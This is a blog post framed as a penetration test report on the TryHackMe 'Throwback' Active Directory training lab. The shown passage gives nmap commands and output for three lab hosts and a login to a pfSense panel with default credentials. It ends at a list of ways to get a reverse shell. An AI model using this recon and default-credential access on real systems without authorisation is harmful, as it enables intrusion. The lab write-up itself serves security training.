<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe: ThrowBack Network Penetration Test Report" /><meta property="og:locale" content="en" /><meta name="description" content="1. Disclamir" /><meta property="og:description" content="1. Disclamir" /><link rel="canonical" href="https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/" /><meta property="og:url" content="https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/" /><meta property="og:site_name" content="0xkaram" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-01T00:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TryHackMe: ThrowBack Network Penetration Test Report" /><meta name="twitter:site" content="@0xkaram" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-03T22:05:30+02:00","datePublished":"2021-01-01T00:00:00+01:00","description":"1. Disclamir","headline":"TryHackMe: ThrowBack Network Penetration Test Report","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/"},"url":"https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/"}</script><title>TryHackMe: ThrowBack Network Penetration Test Report | 0xkaram</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="0xkaram"><meta name="application-name" content="0xkaram"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-3RH8L4C3R4"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-3RH8L4C3R4'); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">0xkaram</a></div><div class="site-subtitle font-italic">CyberSecurity Engineer</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/resume/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>RESUME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xkaram" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xkaram" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['mohamedm.zakzouk','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>TryHackMe: ThrowBack Network Penetration Test Report</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe: ThrowBack Network Penetration Test Report</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Mohamed Zakzouk </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2021-01-01 00:00:00 +0100" >2021-01-01 00:00:00 +0100<i class="unloaded">01 January 2021</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="2022-04-03 22:05:30 +0200 " >2022-04-03 22:05:30 +0200 <i class="unloaded">03 April 2022</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3597 words">19 min read</span></div></div><div class="post-content"><h3 id="1-disclamir"><strong>1. Disclamir</strong></h3><p>Introduction</p><p>Throwback is an Active Directory (AD) lab that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.</p><p>The lab uses a structured, hand-held approach to guide users through exploiting the network. The use of Windows to manage authentication and user identities in IT infrastructure today is so commonly used; as an aspiring security practitioner, it’s crucial to understand how this works and the network’s common weaknesses.</p><p>You will explore the following attacks:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>Phishing &amp; OSINT
Offensive Powershell
Active Directory Basics
Kerberos Abuse
Custom Malicious Macros
Active Directory Enumeration &amp; Exploitation
Attacking Mail Servers
Firewall Pivoting
C2 Frameworks
Abusing Cross-Domain Trusts
</pre></table></code></div></div><p>This network has been designed to have multiple attack paths.</p><h4 id="11-scope"><strong>1.1 Scope</strong></h4><p>The network was made up of 11 machines. We only provided the ip address of the public-facing. The scope of the assessment included the following: <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/machine_layout_1.gif" alt="Scope GIF" /></p><p><strong>As we got from the gif that we only know 3-IPs of all the machines:</strong></p><blockquote><p>Throwback-FW01: 10.200.154.138</p></blockquote><blockquote><p>Throwback-MAIL: 10.200.154.232</p></blockquote><blockquote><p>Throwback-PROD: 10.200.154.219</p></blockquote><p>There are another 3-machines in our domain.</p><p>There are another 5-machines in another domain.</p><h4 id="12-summary-of-results"><strong>1.2 Summary of Results</strong></h4><p>During the time of engagement, I have successfully found several critical vulnerabilities including the ability to run arbitrary commands on each host mentioned above which could lead to the full compro‑ mise of the Throwback network. Initial reconnaissance was lead us to Throwback-FW01 and Throwback-mail web pages. We used Throwback-FW01 web page to get the first RCE. We used the guest mail/password to login and get all users mails, phishing them and got RCE on Throwback-WS01 which is our second one. From those 2-RCEs we started to compromise all the network.</p><h3 id="2-enumeration"><strong>2. Enumeration</strong></h3><h5 id="21-throwback-fw01-10200154138"><strong>2.1 Throwback-FW01: 10.200.154.138</strong></h5><p><strong>2.1.1 Initial Information</strong></p><blockquote><p>The IP address is publicly available: 10.200.154.138</p></blockquote><p><strong>2.1.2 Enumeration</strong></p><p><strong>2.1.2.1 nmap initial scan</strong></p><p><code class="language-plaintext highlighter-rouge">nmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138 </code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 20:25:17 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138</span>
Nmap scan report <span class="k">for </span>10.200.154.138
Host is up <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 14996 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

<span class="c"># Nmap done at Wed Dec  1 20:27:42 2021 -- 1 IP address (1 host up) scanned in 145.09 seconds</span>
</pre></table></code></div></div><p><strong>2.1.2.2 nmap full scan</strong></p><p><code class="language-plaintext highlighter-rouge">nmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 20:29:13 2021 as: nmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138</span>
Nmap scan report <span class="k">for </span>10.200.154.138
Host is up <span class="o">(</span>0.30s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|_  4096 38:04:a0:a1:d0:e6:ab:d9:7d:c0:da:f3:66:bf:77:15 <span class="o">(</span>RSA<span class="o">)</span>
53/tcp  open  domain   <span class="o">(</span>generic dns response: REFUSED<span class="o">)</span>
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://10.200.154.138/
443/tcp open  ssl/http nginx
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>pfSense-5f099cf870c18/organizationName<span class="o">=</span>pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5f099cf870c18
| Not valid before: 2020-07-11T11:05:28
|_Not valid after:  2021-08-13T11:05:28
|_http-title: pfSense - Login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span class="o">=</span>7.92%I<span class="o">=</span>7%D<span class="o">=</span>12/1%Time<span class="o">=</span>61A7BF06%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
SF:ersionBindReqTCP,E,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">0c</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">05</span><span class="se">\0\0\0\0\0\0\0\0</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device <span class="nb">type</span>: general purpose
Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: FreeBSD 11.X <span class="o">(</span>85%<span class="o">)</span>
OS CPE: cpe:/o:freebsd:freebsd:11.2
Aggressive OS guesses: FreeBSD 11.2-RELEASE <span class="o">(</span>85%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Network Distance: 2 hops

TRACEROUTE <span class="o">(</span>using port 80/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   239.65 ms 10.50.151.1
2   252.74 ms 10.200.154.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Wed Dec  1 20:31:44 2021 -- 1 IP address (1 host up) scanned in 151.39 seconds</span>
</pre></table></code></div></div><h5 id="22-throwback-mail-10200154232"><strong>2.2 Throwback-MAIL: 10.200.154.232</strong></h5><p><strong>2.1.1 Initial Information</strong></p><blockquote><p>The IP address of the publicly available web host is 10.200.154.232</p></blockquote><p><strong>2.2.2 Enumeration</strong></p><p><strong>2.2.2.1 nmap initial scan</strong></p><p><code class="language-plaintext highlighter-rouge">nmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 20:35:12 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232</span>
Nmap scan report <span class="k">for </span>10.200.154.232
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 14996 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps

<span class="c"># Nmap done at Wed Dec  1 20:36:58 2021 -- 1 IP address (1 host up) scanned in 105.96 seconds</span>
</pre></table></code></div></div><p><strong>2.2.2.2 nmap full scan</strong></p><p><code class="language-plaintext highlighter-rouge">nmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 21:27:30 2021 as: nmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232</span>
Nmap scan report <span class="k">for </span>10.200.154.232
Host is up <span class="o">(</span>0.20s latency<span class="o">)</span><span class="nb">.</span>

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 f6:14:31:6f:a5:a8:44:bc:5e:c1:bc:1c:5a:75:3d:0b <span class="o">(</span>RSA<span class="o">)</span>
|   256 07:67:60:3f:7f:ba:d4:c5:00:39:51:5e:43:6f:49:b9 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:63:66:a8:c7:39:5b:01:bb:4f:b6:af:6c:3d:c2:af <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-title: Throwback Hacks - Login
|_Requested resource was src/login.php
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
143/tcp open  imap     Dovecot imapd <span class="o">(</span>Ubuntu<span class="o">)</span>
|_imap-capabilities: SASL-IR STARTTLS more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK LOGINDISABLEDA0001 Pre-login ENABLE LITERAL+
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>993/tcp open  ssl/imap Dovecot imapd <span class="o">(</span>Ubuntu<span class="o">)</span>
|_imap-capabilities: <span class="nv">AUTH</span><span class="o">=</span>PLAINA0001 more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK SASL-IR Pre-login ENABLE LITERAL+
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>95%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.39 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.1 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.7 - 3.10 <span class="o">(</span>92%<span class="o">)</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 993/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   149.29 ms 10.50.151.1
2   147.07 ms 10.200.154.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Wed Dec  1 21:28:23 2021 -- 1 IP address (1 host up) scanned in 53.11 seconds</span>
</pre></table></code></div></div><h5 id="23-throwback-prod-10200154219"><strong>2.3 Throwback-PROD: 10.200.154.219</strong></h5><p><strong>2.3.1 Initial Information</strong></p><blockquote><p>The IP address is publicly available: 10.200.154.219</p></blockquote><p><strong>2.3.2 Enumeration</strong></p><p><strong>2.3.2.1 nmap initial scan</strong> <code class="language-plaintext highlighter-rouge">nmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 20:54:55 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219</span>
Nmap scan report <span class="k">for </span>10.200.154.219
Host is up <span class="o">(</span>0.24s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 14992 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

<span class="c"># Nmap done at Wed Dec  1 20:56:23 2021 -- 1 IP address (1 host up) scanned in 88.30 seconds</span>

</pre></table></code></div></div><p><strong>2.3.2.2 nmap full scan</strong></p><p><code class="language-plaintext highlighter-rouge">nmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="c"># Nmap 7.92 scan initiated Wed Dec  1 21:26:57 2021 as: nmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219</span>
Nmap scan report <span class="k">for </span>10.200.154.219
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 <span class="o">(</span>RSA<span class="o">)</span>
|   256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Throwback Hacks
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2021-12-01T19:36:51+00:00<span class="p">;</span> +8m18s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THROWBACK
|   NetBIOS_Domain_Name: THROWBACK
|   NetBIOS_Computer_Name: THROWBACK-PROD
|   DNS_Domain_Name: THROWBACK.local
|   DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local
|   DNS_Tree_Name: THROWBACK.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-12-01T19:36:11+00:00
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>THROWBACK-PROD.THROWBACK.local
| Not valid before: 2021-11-29T17:08:51
|_Not valid after:  2022-05-31T17:08:51
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches <span class="k">for </span>host
Network Distance: 2 hops
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m17s, deviation: 0s, median: 8m17s
| smb2-time:
|   <span class="nb">date</span>: 2021-12-01T19:36:11
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE <span class="o">(</span>using port 445/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   194.29 ms 10.50.151.1
2   190.03 ms 10.200.154.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Wed Dec  1 21:28:33 2021 -- 1 IP address (1 host up) scanned in 96.79 seconds</span>

</pre></table></code></div></div><h3 id="3-throwback-fw01--10200154138"><strong>3 throwback-FW01 10.200.154.138</strong></h3><h4 id="31-throwback-fw01">3.1 throwback-FW01</h4><p>We started with throwback-WF01. After exploring the web service we found that it’s running <code class="language-plaintext highlighter-rouge">pfsense firewall</code>.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/wf1.png" alt="WF01-WEB PAGE" /></p><p>We tried the default Credentials and it worked.</p><p>URL: <a href="http://10.200.154.138">http://10.200.154.138</a></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>&gt; username: admin
&gt; password: pfsense
</pre></table></code></div></div><p>We are in. So, As we know <code class="language-plaintext highlighter-rouge">pfsense firewall</code> provides a command prompt on the underlying server through the “Diagnostics” tab. <img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/di-tab.png" alt="diagnostics tab" /></p><p>We have 4-ways to get a reverse shell from this point.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>1. Shell
2. PHP
3. Upload reverse shell
4. Add SSH key
